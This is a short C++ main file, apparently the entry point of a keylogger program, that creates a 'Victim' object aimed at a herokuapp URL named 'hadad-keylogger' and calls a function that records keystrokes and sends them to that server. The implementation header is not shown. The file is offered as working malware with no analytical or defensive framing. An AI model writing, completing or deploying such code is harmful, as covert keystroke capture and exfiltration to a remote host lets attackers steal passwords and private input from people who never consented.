#include "Victim.h"

int main() {
	Victim victim("https://hadad-keylogger.herokuapp.com");
	victim.recordAndSendKeys();

	return 0;
}